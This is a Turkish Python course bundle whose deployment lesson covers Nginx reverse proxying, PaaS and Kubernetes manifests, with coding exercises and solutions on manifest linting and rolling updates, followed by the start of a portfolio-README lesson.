<p>gunicorn ya da uvicorn Python kodunu çalıştırmakta iyidir ama internete doğrudan açılmak için tasarlanmamıştır. Önlerine Nginx konur ve şu işleri üstlenir: HTTPS sertifikasını sonlandırmak (TLS termination), statik dosyaları Python'a hiç uğratmadan sunmak, yavaş istemcileri tamponlayıp (buffering) uygulama işçilerini boşta bekletmemek, gzip sıkıştırma, istek boyutu ve hız sınırı.</p>
<pre class="code"># /etc/nginx/conf.d/market.conf
upstream api {
    server 127.0.0.1:8000;          # gunicorn/uvicorn; compose'da: server api:8000;
}
server {
    listen 443 ssl;
    server_name market.example.com;
    ssl_certificate     /etc/letsencrypt/live/market.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/market.example.com/privkey.pem;
    client_max_body_size 10m;

    location /static/ {
        alias /srv/market/static/;   # Python'a uğramaz
        expires 7d;
    }
    location / {
        proxy_pass http://api;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 30s;
    }
}
server { listen 80; server_name market.example.com; return 301 https://$host$request_uri; }</pre>
<p><code>X-Forwarded-*</code> başlıkları önemlidir: uygulama artık isteği Nginx'ten aldığı için gerçek istemci IP'sini ve isteğin HTTPS olup olmadığını bu başlıklardan öğrenir (uvicorn'da <code>--proxy-headers</code>, Flask'ta <code>ProxyFix</code>). Nginx, <code>location</code> bloklarından isteğin yoluyla <b>en uzun eşleşen öneki</b> seçer; <code>/static/logo.png</code> için <code>/static/</code>, <code>/api/siparis</code> için <code>/</code> çalışır. Yapılandırmayı her değişiklikten sonra <code>nginx -t</code> ile denetle, sonra <code>nginx -s reload</code> ile kesintisiz yeniden yükle.</p>
<h2>PaaS'a adım adım dağıtım</h2>
<p>Platform hizmeti (PaaS) sunucu, Nginx ve sertifika işini senin yerine yapar. Render, Railway ve Fly.io'da akış neredeyse aynıdır:</p>
<div class="steps-list"><ol>
<li>Depoda çalışan bir <code>Dockerfile</code> olsun; uygulama portu <b><code>PORT</code> ortam değişkeninden</b> okusun (<code>--bind 0.0.0.0:$PORT</code>). Platform portu kendisi atar.</li>
<li>GitHub deposunu platforma bağla; her <code>main</code> push'unda imaj otomatik inşa edilir.</li>
<li>Yönetilen PostgreSQL ekle; platform <code>DATABASE_URL</code>'i ortam değişkeni olarak verir. Sırları panelden gir, depoya koyma.</li>
<li>Sağlık kontrolü yolunu (<code>/health</code>) tanımla; yeni sürüm sağlıklı olmadan trafik ona geçmez.</li>
<li>Migration'ı yayın öncesi komut olarak ayarla (Render'da pre-deploy command, Fly'da <code>release_command = "alembic upgrade head"</code>).</li>
</ol></div>
<pre class="code"># Fly.io
fly launch            # fly.toml üretir, bölge ve uygulama adı sorar
fly secrets set SECRET_KEY=... DATABASE_URL=...
fly deploy            # imajı inşa eder, sağlık kontrolüyle yayına alır
fly logs              # canlı log</pre>
<h2>Kubernetes'in temel nesneleri</h2>
<p>Kubernetes (k8s), konteynerleri bir makine kümesinde çalıştıran orkestratördür. Ona "ne istediğini" YAML ile söylersin (bildirimsel, declarative), o da gerçek durumu sürekli istenen duruma yaklaştırır: bir pod çökerse yenisini başlatır.</p>
<div class="tbl-wrap"><table><tr><th>Nesne</th><th>Ne yapar?</th><th>Compose karşılığı</th></tr>
<tr><td>Pod</td><td>Bir ya da birkaç konteynerin en küçük çalışma birimi; geçicidir</td><td>Tek konteyner</td></tr>
<tr><td>Deployment</td><td>İstenen kopya sayısını (replicas) korur, sürüm geçişini kademeli yapar</td><td><code>services.api</code> + <code>deploy.replicas</code></td></tr>
<tr><td>Service</td><td>Etiketle seçilen podlara sabit ad ve IP verir, yükü dağıtır</td><td>Servis adıyla erişim</td></tr>
<tr><td>ConfigMap</td><td>Gizli olmayan ayarlar (metin değerler)</td><td><code>environment:</code></td></tr>
<tr><td>Secret</td><td>Parola, anahtar; değerler base64 ile kodlanır (şifreleme değildir)</td><td><code>.env</code> / secrets</td></tr>
<tr><td>Probe</td><td>liveness: takıldıysa yeniden başlat; readiness: hazır değilse trafik verme</td><td><code>healthcheck</code></td></tr></table></div>
<pre class="code">apiVersion: apps/v1
kind: Deployment
metadata: {name: market-api}
spec:
  replicas: 3
  selector: {matchLabels: {app: market-api}}
  template:
    metadata: {labels: {app: market-api}}
    spec:
      containers:
        - name: api
          image: ghcr.io/anadolu/market-api:1.4.2
          ports: [{containerPort: 8000}]
          envFrom: [{configMapRef: {name: market-ayar}}, {secretRef: {name: market-sir}}]
          resources: {requests: {cpu: 100m, memory: 128Mi}, limits: {memory: 256Mi}}
          readinessProbe: {httpGet: {path: /ready, port: 8000}, periodSeconds: 5}
          livenessProbe: {httpGet: {path: /health, port: 8000}, initialDelaySeconds: 10}
---
apiVersion: v1
kind: Service
metadata: {name: market-api}
spec:
  selector: {app: market-api}      # template.labels ile AYNI olmalı
  ports: [{port: 80, targetPort: 8000}]</pre>
<pre class="code">kubectl apply -f k8s/                 # istenen durumu gönder
kubectl get pods -l app=market-api     # durum
kubectl logs deploy/market-api -f      # log
kubectl rollout status deploy/market-api
kubectl rollout undo deploy/market-api # bir önceki sürüme dön</pre>
<div class="note"><b>Kendi bilgisayarında dene</b>Docker Desktop'ta Kubernetes'i açabilir ya da <code>kind</code> veya <code>minikube</code> ile yerel küme kurabilirsin. Tarayıcıda küme yok; ama manifestler sadece YAML'dır ve en sık hatalar (seçici uyuşmazlığı, eksik probe, <code>latest</code> etiketi) Python ile yakalanabilir:</div>
<pre class="py">import yaml
metin = """
apiVersion: apps/v1
kind: Deployment
metadata: {name: market-api}
spec:
  replicas: 2
  selector: {matchLabels: {app: market-api}}
  template:
    metadata: {labels: {app: market-api, katman: web}}
    spec:
      containers: [{name: api, image: "market-api:latest"}]
---
apiVersion: v1
kind: Service
metadata: {name: market-api}
spec: {selector: {app: market-apı}, ports: [{port: 80, targetPort: 8000}]}
"""
belgeler = list(yaml.safe_load_all(metin))
dep = next(b for b in belgeler if b["kind"] == "Deployment")
etiketler = dep["spec"]["template"]["metadata"]["labels"]
for b in belgeler:
    if b["kind"] == "Service":
        secici = b["spec"]["selector"]
        uyar = all(etiketler.get(k) == v for k, v in secici.items())
        print(b["metadata"]["name"], "podları buluyor mu?", uyar)
for c in dep["spec"]["template"]["spec"]["containers"]:
    print(c["name"], "etiket:", c["image"].rpartition(":")[2], "| probe var mı?", "readinessProbe" in c)</pre>
<p>Tek harflik bir fark (<code>market-apı</code>) Service'in hiçbir podu bulamamasına yol açar; kubectl hata vermez, istekler sadece yanıtsız kalır. Bu tür denetimler CI'da <code>kubeconform</code> ve <code>kube-linter</code> gibi araçlarla yapılır.</p>
<div class="note"><b>Gerçek işte</b>Çoğu ekip Kubernetes'e doğrudan değil, Helm şablonları ya da Kustomize ile ortam başına (staging, prod) farklı değerler vererek dağıtım yapar. Yeni başlayan biri için önemli olan YAML'ı okuyabilmek, probe ve kaynak sınırlarını anlamak ve <code>kubectl get/describe/logs</code> ile sorunu bulabilmektir.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'docker-deploy-y1',
        stage: 'Isınma',
        q: 'Bir podun <b>readinessProbe</b>\'u başarısız olmaya başladı, livenessProbe ise geçiyor. Kubernetes ne yapar?',
        o: ['Podu hemen yeniden başlatır', 'Podu Service\'in trafik listesinden çıkarır, yeniden başlatmaz', 'Deployment\'ı bir önceki sürüme geri alır', 'Hiçbir şey; readiness yalnız ilk açılışta denetlenir'],
        a: 1,
        why: 'Readiness "trafik almaya hazır mısın?" sorusudur; başarısızsa pod Service uç noktalarından çıkarılır ama çalışmaya devam eder (ör. veritabanı geçici olarak yok). Yeniden başlatma liveness başarısız olduğunda yapılır. Geri alma otomatik değildir, kubectl rollout undo ile sen yaparsın.'
      },
      {
        t: 'mc',
        id: 'docker-deploy-y2',
        stage: 'Isınma',
        q: 'Uygulama Nginx arkasında çalışıyor ve loglarda her isteğin IP\'si <code>127.0.0.1</code> görünüyor. En olası neden?',
        o: ['Nginx istekleri önbellekten yanıtlıyor', 'Uygulama X-Forwarded-For başlığını dikkate almıyor', 'gunicorn yanlış porta bağlanmış', 'HTTPS sertifikası süresi dolmuş'],
        a: 1,
        why: 'Uygulamanın gördüğü bağlantı Nginx\'ten gelir; gerçek istemci adresi Nginx\'in eklediği X-Forwarded-For / X-Real-IP başlığındadır. uvicorn --proxy-headers ya da Flask ProxyFix ile bu başlıklara güvenmesini söylemen gerekir (yalnız Nginx\'ten geldiğinden eminsen).'
      },
      {
        t: 'predict',
        id: 'docker-deploy-y3',
        stage: 'Kodu oku',
        q: 'Secret değerleri base64 ile saklanır. Bu kod ne yazdırır?',
        o: ['parola123 12', 'cGFyb2xhMTIz 12', 'parola123 9', '***** 12'],
        a: 0,
        code: 'import base64, yaml\ns = yaml.safe_load("""\nkind: Secret\ndata:\n  DB_SIFRE: cGFyb2xhMTIz\n""")\ndeger = base64.b64decode(s["data"]["DB_SIFRE"]).decode()\nprint(deger, len(s["data"]["DB_SIFRE"]))\n',
        why: 'base64 bir kodlamadır, şifreleme değil: herkes tek satırla çözebilir. 9 baytlık "parola123" kodlanınca 12 karakter olur. Bu yüzden Secret\'lara erişim RBAC ile sınırlanır ve küme tarafında şifreleme (encryption at rest) açılır.'
      },
      {
        t: 'predict',
        id: 'docker-deploy-y4',
        stage: 'Kodu oku',
        q: 'Ortam değişkenleri metin olmalıdır. Bu ConfigMap okununca ne yazdırır?',
        o: ['[\'str\', \'str\', \'str\']', '[\'bool\', \'int\', \'str\']', '[\'str\', \'int\', \'str\']', '[\'bool\', \'str\', \'str\']'],
        a: 1,
        code: 'import yaml\ncm = yaml.safe_load("""\ndata:\n  DEBUG: false\n  PORT: 8000\n  BOLGE: "eu"\n""")\nprint([type(v).__name__ for v in cm["data"].values()])\n',
        why: 'YAML false\'u bool, 8000\'i int olarak okur. Kubernetes ConfigMap verisinde yalnız metin kabul eder ve bu manifesti reddeder; değerleri "false" ve "8000" diye tırnaklamalısın.'
      },
      {
        t: 'order',
        id: 'docker-deploy-y5',
        stage: 'Kodu oku',
        q: '<p>Çok belgeli (<code>---</code> ile ayrılmış) bir manifest dosyasındaki nesneleri türüne göre sayan programın satırlarını sırala. Beklenen çıktı:</p><pre class="out">{\'ConfigMap\': 1, \'Deployment\': 1, \'Service\': 2}</pre>',
        lines: [
          'import yaml',
          'metin = "kind: Deployment\\n---\\nkind: Service\\n---\\nkind: Service\\n---\\nkind: ConfigMap\\n"',
          'sayac = {}',
          'for belge in yaml.safe_load_all(metin):',
          '    sayac[belge["kind"]] = sayac.get(belge["kind"], 0) + 1',
          'print(dict(sorted(sayac.items())))'
        ],
        expect: '{\'ConfigMap\': 1, \'Deployment\': 1, \'Service\': 2}\n',
        hint: 'safe_load_all bir üreteç döndürür; döngüden önce sayaç hazır olmalı.',
        why: 'safe_load yalnız ilk belgeyi okur; --- ile ayrılmış dosyada tüm nesneler için safe_load_all gerekir. Sonuç, sözlük sıralanarak deterministik yazdırılır.'
      },
      {
        t: 'code',
        id: 'docker-deploy-y6',
        stage: 'Rehberli',
        diff: 2,
        q: '<p><code>sahipsiz_servisler(yaml_metin)</code> yaz: çok belgeli manifestteki her <code>Service</code>\'in <code>spec.selector</code> etiketlerinin, en az bir <code>Deployment</code>\'ın <code>spec.template.metadata.labels</code> etiketlerinin <b>alt kümesi</b> olup olmadığını denetlesin. Hiçbir Deployment\'la eşleşmeyen Service adlarını sıralı liste olarak döndür.</p>',
        guide: [
          'yaml.safe_load_all ile belgeleri listeye al; boş belgeleri (None) atla.',
          'Deployment\'ların şablon etiketlerini (sözlük) bir listede topla.',
          'Her Service için selector\'ın tüm anahtar-değer çiftleri bir etiket sözlüğünde var mı bak: all(...) ve any(...).',
          'Eşleşmeyenlerin adlarını sorted ile döndür.'
        ],
        example: 'istenen = {"renk": "mavi"}\nurunler = [{"renk": "mavi", "beden": "M"}, {"renk": "kırmızı"}]\nprint([u for u in urunler if all(u.get(k) == v for k, v in istenen.items())])\n',
        start: 'import yaml\n\ndef sahipsiz_servisler(yaml_metin):\n    belgeler = [b for b in yaml.safe_load_all(yaml_metin) if b]\n    etiketler = []\n    # TODO: Deployment şablon etiketlerini topla\n    sahipsiz = []\n    # TODO: her Service\'in selector\'ı bir etiket sözlüğünün alt kümesi mi?\n    return sorted(sahipsiz)\n',
        sol: 'import yaml\n\ndef sahipsiz_servisler(yaml_metin):\n    belgeler = [b for b in yaml.safe_load_all(yaml_metin) if b]\n    etiketler = [b["spec"]["template"]["metadata"]["labels"] for b in belgeler if b["kind"] == "Deployment"]\n    sahipsiz = []\n    for b in belgeler:\n        if b["kind"] != "Service":\n            continue\n        secici = b["spec"]["selector"]\n        if not any(all(e.get(k) == v for k, v in secici.items()) for e in etiketler):\n            sahipsiz.append(b["metadata"]["name"])\n    return sorted(sahipsiz)\n',
        tests: 'M = """\nkind: Deployment\nmetadata: {name: api}\nspec: {template: {metadata: {labels: {app: api, katman: web}}}}\n---\nkind: Deployment\nmetadata: {name: isci}\nspec: {template: {metadata: {labels: {app: isci}}}}\n---\nkind: Service\nmetadata: {name: api-svc}\nspec: {selector: {app: api}}\n---\nkind: Service\nmetadata: {name: yanlis-svc}\nspec: {selector: {app: apı}}\n---\nkind: Service\nmetadata: {name: fazla-svc}\nspec: {selector: {app: isci, katman: web}}\n---\n"""\nassert sahipsiz_servisler(M) == ["fazla-svc", "yanlis-svc"], "yanlis-svc (yazım hatası) ve fazla-svc (isci podunda katman etiketi yok) sahipsiz olmalı"\nassert sahipsiz_servisler("kind: Service\\nmetadata: {name: s}\\nspec: {selector: {app: x}}\\n") == ["s"], "Hiç Deployment yoksa her Service sahipsizdir"\n',
        hints: [
          'Selector bir alt küme denetimidir: seçicideki her çift pod etiketlerinde aynı değerle bulunmalı.',
          'any(all(e.get(k) == v for k, v in secici.items()) for e in etiketler)',
          'Sondaki boş --- belgesi None döner; listeyi kurarken if b ile ele.'
        ],
        why: 'Seçici uyuşmazlığı kubectl apply sırasında hata vermez; Service\'in uç nokta listesi boş kalır ve istekler zaman aşımına düşer. CI\'da bu tür denetimler dağıtımdan önce yakalar.'
      },
      {
        t: 'code',
        id: 'docker-deploy-y7',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p><code>deployment_denetle(yaml_metin)</code> yaz: tek bir Deployment manifestini <code>yaml.safe_load</code> ile okuyup kurallara göre hata mesajlarının listesini döndürsün (sıra: önce replicas, sonra konteynerler manifestteki sırayla, her konteynerde kurallar aşağıdaki sırayla):</p><ul><li><code>replicas</code> 2\'den azsa: <code>"replicas en az 2 olmalı"</code></li><li>imaj etiketi yoksa ya da <code>latest</code> ise: <code>"&lt;ad&gt;: sabit imaj etiketi yok"</code></li><li><code>resources.limits.memory</code> yoksa: <code>"&lt;ad&gt;: bellek sınırı yok"</code></li><li><code>readinessProbe</code> yoksa: <code>"&lt;ad&gt;: readinessProbe yok"</code></li><li><code>livenessProbe</code> yoksa: <code>"&lt;ad&gt;: livenessProbe yok"</code></li></ul><p>Etiket, imajın son <code>/</code>\'dan sonraki kısmındaki <code>:</code>\'den sonra gelen metindir (kayıt defteri portu <code>host:5000/ad</code> etiket sayılmaz).</p>',
        start: 'import yaml\n\ndef deployment_denetle(yaml_metin):\n    pass\n',
        sol: 'import yaml\n\ndef deployment_denetle(yaml_metin):\n    d = yaml.safe_load(yaml_metin)\n    hatalar = []\n    spec = d.get("spec", {})\n    if spec.get("replicas", 1) < 2:\n        hatalar.append("replicas en az 2 olmalı")\n    for c in spec["template"]["spec"]["containers"]:\n        ad = c["name"]\n        son = c["image"].rsplit("/", 1)[-1]\n        etiket = son.split(":", 1)[1] if ":" in son else ""\n        if etiket in ("", "latest"):\n            hatalar.append(f"{ad}: sabit imaj etiketi yok")\n        if not c.get("resources", {}).get("limits", {}).get("memory"):\n            hatalar.append(f"{ad}: bellek sınırı yok")\n        if "readinessProbe" not in c:\n            hatalar.append(f"{ad}: readinessProbe yok")\n        if "livenessProbe" not in c:\n            hatalar.append(f"{ad}: livenessProbe yok")\n    return hatalar\n',
        tests: 'IYI = """\nkind: Deployment\nspec:\n  replicas: 3\n  template:\n    spec:\n      containers:\n        - name: api\n          image: registry.local:5000/market-api:1.4.2\n          resources: {limits: {memory: 256Mi}}\n          readinessProbe: {httpGet: {path: /ready, port: 8000}}\n          livenessProbe: {httpGet: {path: /health, port: 8000}}\n"""\nassert deployment_denetle(IYI) == [], "Kurallara uyan manifest hata vermemeli (5000 bir port, etiket 1.4.2)"\nKOTU = """\nkind: Deployment\nspec:\n  template:\n    spec:\n      containers:\n        - name: api\n          image: registry.local:5000/market-api\n          readinessProbe: {httpGet: {path: /ready, port: 8000}}\n        - name: log\n          image: fluent-bit:latest\n          resources: {limits: {memory: 64Mi}}\n          livenessProbe: {exec: {command: [true]}}\n"""\nbeklenen = ["replicas en az 2 olmalı", "api: sabit imaj etiketi yok", "api: bellek sınırı yok", "api: livenessProbe yok", "log: sabit imaj etiketi yok", "log: readinessProbe yok"]\nassert deployment_denetle(KOTU) == beklenen, f"Beklenen {beklenen}, gelen {deployment_denetle(KOTU)}"\n',
        hints: [
          'replicas yazılmamışsa Kubernetes 1 kabul eder.',
          'Etiketi bulmak için önce rsplit("/", 1)[-1] ile son parçayı al, sonra ":" ara.',
          'İç içe isteğe bağlı alanlarda c.get("resources", {}).get("limits", {}) zinciri KeyError\'u önler.'
        ],
        why: 'Bu, kube-linter benzeri araçların yaptığının özüdür. latest etiketi hangi sürümün çalıştığını belirsizleştirir ve geri almayı imkânsız kılar; bellek sınırı olmayan pod düğümü boğabilir; probe\'suz pod hazır olmadan trafik alır.'
      },
      {
        t: 'code',
        id: 'docker-deploy-y8',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Nginx\'in <code>location</code> seçimini taklit et. <code>hedef_bul(konumlar, yol)</code> yaz: <code>konumlar</code> sözlüğü önek → hedef eşlemesidir (ör. <code>{"/": "api", "/static/": "dosya"}</code>). Yolla eşleşen <b>en uzun</b> öneki seçip hedefini döndür; hiçbiri eşleşmezse <code>None</code>. Ayrıca <code>"= /tam"</code> biçimindeki anahtarlar tam eşleşmedir ve varsa her şeyden önce gelir.</p>',
        start: 'def hedef_bul(konumlar, yol):\n    pass\n',
        sol: 'def hedef_bul(konumlar, yol):\n    for anahtar, hedef in konumlar.items():\n        if anahtar.startswith("= ") and anahtar[2:] == yol:\n            return hedef\n    en_iyi = None\n    for anahtar, hedef in konumlar.items():\n        if anahtar.startswith("= "):\n            continue\n        if yol.startswith(anahtar) and (en_iyi is None or len(anahtar) > len(en_iyi[0])):\n            en_iyi = (anahtar, hedef)\n    return en_iyi[1] if en_iyi else None\n',
        tests: 'K = {"/": "api", "/static/": "dosya", "/static/img/": "cdn", "= /health": "nginx", "/api/": "api-v2"}\nassert hedef_bul(K, "/static/css/a.css") == "dosya", "/static/ en uzun eşleşen önek"\nassert hedef_bul(K, "/static/img/logo.png") == "cdn", "/static/img/ daha uzun olduğu için kazanır"\nassert hedef_bul(K, "/health") == "nginx", "Tam eşleşme (=) önceliklidir"\nassert hedef_bul(K, "/healthz") == "api", "= yalnız birebir yolda çalışır; /healthz için / kalır"\nassert hedef_bul(K, "/api/siparis") == "api-v2", "/api/ önekine gitmeli"\nassert hedef_bul({"/static/": "dosya"}, "/sepet") is None, "Hiçbir önek eşleşmezse None"\n',
        hints: ['Önce "= " ile başlayan anahtarlarda birebir eşitlik ara.', 'Diğerlerinde yol.startswith(onek) olanlar arasından en uzun öneki seç.', 'max(eslesenler, key=len) de kullanılabilir; boşsa None döndür.'],
        why: 'Nginx önek konumlarında sıraya değil uzunluğa bakar; = ile tanımlı tam eşleşme ise aramayı hemen bitirir. (Gerçek Nginx\'te ^~ ve ~ regex konumları da vardır.) /static yerine /static/ yazmak gibi küçük farklar beklenmedik yönlendirmelere yol açar.'
      },
      {
        t: 'code',
        id: 'docker-deploy-y9',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>configmap_verisi(yaml_metin)</code> bir YAML ayar dosyasını Kubernetes ConfigMap <code>data</code> alanına uygun hâle getirmeli: tüm değerler metin olmalı; bool değerler Kubernetes\'in beklediği gibi küçük harfle <code>"true"</code>/<code>"false"</code>, <code>None</code> değerler boş metin olmalı. Şu anki kod <code>"False"</code> üretiyor ve <code>None</code>\'ı <code>"None"</code> yapıyor.</p>',
        start: 'import yaml\n\ndef configmap_verisi(yaml_metin):\n    ham = yaml.safe_load(yaml_metin)\n    return {k: str(v) for k, v in ham.items()}\n',
        sol: 'import yaml\n\ndef configmap_verisi(yaml_metin):\n    ham = yaml.safe_load(yaml_metin)\n    sonuc = {}\n    for k, v in ham.items():\n        if isinstance(v, bool):\n            sonuc[k] = "true" if v else "false"\n        elif v is None:\n            sonuc[k] = ""\n        else:\n            sonuc[k] = str(v)\n    return sonuc\n',
        tests: 'v = configmap_verisi("DEBUG: false\\nPORT: 8000\\nORAN: 0.25\\nBOLGE: eu\\nSENTRY_DSN:\\nCACHE: yes\\n")\nassert v["DEBUG"] == "false", "bool küçük harfle \'false\' olmalı, Python\'ın \'False\' yazımı değil"\nassert v["PORT"] == "8000" and v["ORAN"] == "0.25", "Sayılar metne çevrilmeli"\nassert v["SENTRY_DSN"] == "", "Boş değer \'None\' değil boş metin olmalı"\nassert v["CACHE"] == "true", "YAML 1.1\'de yes bool True okunur; \'true\' yazılmalı"\nassert all(isinstance(x, str) for x in v.values()), "Tüm değerler str olmalı"\n',
        hints: ['str(False) "False" verir; Kubernetes ve çoğu uygulama "false" bekler.', 'bool kontrolünü int/float\'tan ayrı yap; None için ayrı dal ekle.', 'isinstance(v, bool) dalı: "true" if v else "false"'],
        why: 'YAML\'ın tür çıkarımı (false, yes, 8000) ConfigMap\'te sık hata kaynağıdır. Uygulama tarafında da ortam değişkenleri hep metin gelir; "False" ya da "None" gibi Python yazımları uygulamada beklenmedik dallara yol açar.'
      },
      {
        t: 'code',
        id: 'docker-deploy-y10',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Deployment\'ın kademeli güncellemesini (rolling update) simüle et. <code>kademeli_guncelle(replicas, max_surge, max_unavailable)</code> her adımdan sonraki <code>(eski, yeni)</code> pod sayılarını liste olarak döndürsün. Yeni podların anında hazır olduğunu varsay. Her adımda:</p><ol><li>Ekle: toplam pod <code>replicas + max_surge</code>\'ı aşmayacak ve yeni sayısı <code>replicas</code>\'ı geçmeyecek kadar yeni pod ekle.</li><li>Sil: hazır pod sayısı <code>replicas - max_unavailable</code>\'ın altına düşmeyecek kadar eski pod sil.</li></ol><p>Eski 0, yeni <code>replicas</code> olunca dur. <code>max_surge</code> ve <code>max_unavailable</code> ikisi de 0 ise ilerleme imkânsızdır: <code>ValueError</code> fırlat.</p>',
        start: 'def kademeli_guncelle(replicas, max_surge, max_unavailable):\n    adimlar = []\n    return adimlar\n',
        sol: 'def kademeli_guncelle(replicas, max_surge, max_unavailable):\n    if max_surge == 0 and max_unavailable == 0:\n        raise ValueError("max_surge ve max_unavailable ikisi birden 0 olamaz")\n    eski, yeni = replicas, 0\n    adimlar = []\n    while not (eski == 0 and yeni == replicas):\n        ekle = max(0, min(replicas + max_surge - (eski + yeni), replicas - yeni))\n        yeni += ekle\n        sil = max(0, min(eski, eski + yeni - (replicas - max_unavailable)))\n        eski -= sil\n        adimlar.append((eski, yeni))\n    return adimlar\n',
        tests: 'assert kademeli_guncelle(3, 1, 0) == [(2, 1), (1, 2), (0, 3)], "surge=1: her adımda bir yeni, bir eski"\nassert kademeli_guncelle(4, 0, 2) == [(2, 0), (0, 2), (0, 4)], "surge=0, unavailable=2: önce ikisi silinir, sonra yeniler eklenir"\nassert kademeli_guncelle(4, 2, 1) == [(1, 2), (0, 4)], "surge=2, unavailable=1"\nassert kademeli_guncelle(1, 1, 0) == [(0, 1)], "Tek kopyada surge ile kesintisiz geçiş"\ntry:\n    kademeli_guncelle(3, 0, 0)\n    assert False, "İkisi de 0 ise ValueError beklenir"\nexcept ValueError:\n    pass\n',
        hints: [
          'Durumu (eski, yeni) iki sayıyla tut; her turda önce ekle sonra sil.',
          'ekle = min(replicas + max_surge - (eski + yeni), replicas - yeni); negatifse 0.',
          'sil = min(eski, (eski + yeni) - (replicas - max_unavailable)); negatifse 0.'
        ],
        why: 'Kubernetes\'in varsayılanı maxSurge=25%, maxUnavailable=25%\'tir. surge kapasite fazlası pahasına hız kazandırır; unavailable ise ek kaynak istemeden ama kapasiteyi geçici düşürerek ilerler. İkisi birden 0 olursa güncelleme hiç ilerleyemez; Kubernetes bu ayarı reddeder.'
      }
    ],
    faq: [
      {
        q: 'Render/Fly varken Kubernetes\'e ne zaman geçmeliyim?',
        a: 'Tek ya da birkaç servisli bir ürün için PaaS çok daha ucuz ve basittir. Kubernetes, çok sayıda servis, ekip başına bağımsız dağıtım, özel ağ kuralları, GPU iş yükleri ya da şirket politikası gerektirdiğinde anlamlıdır ve genellikle yönetilen hizmet (EKS, GKE, AKS) olarak kullanılır.'
      },
      {
        q: 'Nginx yerine Caddy ya da Traefik kullanabilir miyim?',
        a: 'Evet. Caddy Let\'s Encrypt sertifikasını kendiliğinden alır ve yapılandırması kısadır; Traefik Docker ve Kubernetes etiketlerinden yönlendirmeyi otomatik çıkarır. Kavramlar (ters vekil, TLS sonlandırma, X-Forwarded başlıkları) aynıdır.'
      }
    ],
    mistakes: [
      {
        why: 'Konteyner içinde 127.0.0.1 yalnız konteynerin kendisinden erişilebilir; platformun yönlendiricisi ulaşamaz. PaaS portu PORT değişkeniyle verir; sabit port yazmak dağıtımı "sağlık kontrolü başarısız" ile düşürür.',
        bad: 'gunicorn app:app --bind 127.0.0.1:8000',
        good: 'gunicorn app:app --bind 0.0.0.0:${PORT:-8000}'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'git-proje-yapisi' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'git-proje-yapisi',
    min: 25,
    needs: ['sqlite3'],
    html: `<p>Bir işe alımcı portföy deponu ortalama bir-iki dakika inceler ve çoğu zaman yalnız README'yi okur. Bu bölüm, bir analiz ya da yazılım projesini GitHub'da "okunur" bir portföy parçasına çevirmeyi anlatıyor: README şablonu, bulgu özeti, ekran görüntüleri ve depoyu yayına alma adımları.</p>
<h2>Portföy deposunun yapısı</h2>
<pre class="out">anadolu-market-analizi/
├── README.md              ← vitrin: 1 dakikada okunur
├── notebooks/             ← keşif (çıktıları temizlenmiş, nbstripout)
├── src/analiz/            ← tekrar kullanılan kod
├── raporlar/rapor.html    ← nbconvert/Quarto çıktısı
├── gorseller/             ← README'de kullanılan PNG'ler (küçük, sıkıştırılmış)
├── data/README.md         ← veri nereden, nasıl indirilir (ham veri depoda değil)
├── tests/
├── pyproject.toml / requirements.txt
└── LICENSE</pre>
<h2>README şablonu</h2>
<p>İyi bir portföy README'si bir hikâye anlatır: sorun neydi, ne yaptın, ne buldun, nasıl tekrar üretilir. Aşağıdaki başlıklar hem analiz hem yazılım projelerinde işe yarar:</p>
<pre class="code"># Anadolu Market: Şehir bazlı satış ve iade analizi

&gt; 910 siparişlik e-ticaret verisinde ciro ve iadeyi şehir, kanal ve zamana göre inceledim.
&gt; En önemli bulgu: ... (tek cümle, rakamla)

![Şehir bazlı ciro](gorseller/sehir_ciro.png)

## Sorun
Yönetim hangi şehirlerde büyümeye yatırım yapılacağını soruyor.

## Veri
- Kaynak: Kesit Python "anadolu_market" kurgusal veri seti (10 tablo, 6.236 satır)
- Dönem: 2022-06 – 2024-12

## Yöntem
SQL (sqlite3) ile birleştirme → pandas ile temizlik → kohort ve RFM → görselleştirme

## Bulgular
| Şehir | Teslim edilen sipariş | Ciro (TL) |
|---|---|---|
| İstanbul | 162 | 199.387,25 |
| ...

1. ...
2. ...

## Öneriler ve sınırlamalar

## Nasıl çalıştırılır
    git clone https://github.com/kullanici/anadolu-market-analizi
    cd anadolu-market-analizi &amp;&amp; pip install -r requirements.txt
    python -m analiz.rapor        # raporlar/rapor.html üretir

## Teknolojiler
Python 3.12 · pandas · SQLite · matplotlib · pytest</pre>
<div class="tip"><b>Bulgu özeti nasıl yazılır?</b>Her bulgu bir cümle, bir rakam ve bir "neden önemli" içersin: "İzmir, İstanbul'un yarısı kadar siparişle onun cirosunun üçte ikisini üretiyor; sipariş başı ciro İstanbul'dan %26 yüksek." Yöntemi bulgunun önüne koyma; okuyucu önce sonucu görmek ister. Sınırlamaları dürüstçe yaz (kurgusal veri, kısa dönem, örneklem küçük): bu bir zayıflık değil, olgunluk işaretidir.</div>
<p>Bulgu tablosunu elle yazmak yerine koddan üret; README sayıları ile rapor sayıları hiç ayrışmaz:</p>
<pre class="py">import veri
conn = veri.baglan("anadolu_market", tablolar=["orders", "order_items", "customers"])
satirlar = conn.execute("""
    SELECT c.city, COUNT(DISTINCT o.order_id),
           ROUND(SUM(oi.quantity * oi.unit_price * (1 - oi.discount)), 2) AS ciro
    FROM orders o JOIN customers c USING (customer_id) JOIN order_items oi USING (order_id)
    WHERE o.status = 'delivered' AND c.city IS NOT NULL
    GROUP BY c.city ORDER BY ciro DESC LIMIT 3""").fetchall()

tl = lambda x: f"{x:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
print("| Şehir | Teslim edilen sipariş | Ciro (TL) |")
print("|---|---|---|")
for sehir, n, ciro in satirlar:
    print(f"| {sehir} | {n} | {tl(ciro)} |")</pre>
<h2>Ekran görüntüleri ve görseller</h2>
